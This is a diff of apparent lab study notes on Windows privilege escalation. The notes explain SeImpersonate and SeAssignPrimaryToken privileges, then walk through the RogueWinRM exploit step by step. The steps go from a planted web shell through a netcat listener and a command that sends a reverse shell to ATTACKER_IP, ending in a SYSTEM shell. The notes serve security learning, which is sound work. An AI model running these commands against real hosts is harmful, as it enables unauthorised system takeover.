@@ -603,9 +603,84 @@ Not enough memory resources are available to process this command.
 C:\Windows\system32>whoami
 nt authority\system
 ```
-## SeImpersonate / SeAssignPrimaryToken
+## SeImpersonate / SeAssignPrimaryToken Privileges
+* Allow a process to impersonate users and act on their behalf.
+  * E.g. spawn a process or thread under the security context of another user.
+### FTP Example
+1. FTP service running with user "ftp".
+2. User "Ann" logs onto the FTP server to access their files.
+3. FTP service tries to access the files using its access token rather than Ann's
+#### Without SeImpersonate / SeAssignPrimaryToken Privileges
+* All files would need to be accessible to "ftp" user.
+* Must manually configure specific permissions for each served file/directory.
+  * Impossible to delegate authorisation to OS as all files are accessed by "ftp" user.
+  * FTP service must implement this instead.
+* Attacker would gain access to all folders if FTP service were compromised.
+#### With SeImpersonate / SeAssignPrimaryToken Privileges
+* FTP service can temporarily grab access token of user logging in if SeImpersonate or SeAssignPrimaryToken priveleges are applied.
+  * Use token to perform FTP tasks on behalf of the user.
+* Files do not need to provide access to "ftp" user.
+* OS handles authorisation.
+  
+*  Attacker can impersonate any user connecting and authenticating to that process if they can take control of a process with SeImpersonate or SeAssignPrimaryToken Privileges.
+  *  `LOCAL SERVICE` and `NETWORK SERVICE` accounts already have these privileges.
+     *  Used to spawn services using restricted accounts.
+     *  Logical for them to impersonate connecting users.
+  *  IIS creates similar default account `iis apppool\defaultapppool` for web apps.
+## RogueWinRM exploit example
+* Exploit is possible because whenever a user starts the BITS service it automatically creates a connection to TCP/5985 using SYSTEM privileges.
+  * TCP/5985 typically used by WinRM service.
+  * Port exposes PowerShell console to be used remotely.
+    * SSH but usaing PowerShell.
+* Attacker can start fake WinRM service if WinRm is not running on target.
+* Fake service catches SYSTEM authentication attempt made by BITS service.
+* Attacker can execute any command if they have SeImpersonate privileges.  
+* Assume that IIS website has already been compromised and a web shell has been planted on `https://10.10.33.51`.
+### 1. Use web shell to check assigned permissions of compromised account include SeImpersonate and SeAssignPrimaryToken.
+```
+PRIVILEGES INFORMATION
+----------------------
 
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+#### 2. Upload "RogueWinRM" exploit to target.
+* Already uploaded to `C:\tools` folder.
+#### 3. Start Netcat Listener to receive reverse shell.
+```
+nc -lvnp 4442
+```
+#### 4. Use web shell to trigger RogueWinRM exploit.
+* Exploit may take up to two minutes to work as BITS service stops after two minutes of starting.
+```
+c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+```
+* `-p` specifies executable to be run.
+  * `nc64.exe`
+* `-a` used to pass arguements to executable.
+  * `-e cmd.exe ATTACKER_IP 4442`
+  * Establish a reverse shell against attacker machine.
+#### 5. Shell created with SYSTEM privileges.
+```
+Connection from 10.10.33.51 49899 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
 # Abusing Vulnerable Software
+## Unpatched Software
+* Can present various privilege escalation opportunities.
+### Druva inSync 6.6.3 Case Study
 
 
 # Tools of the Trade
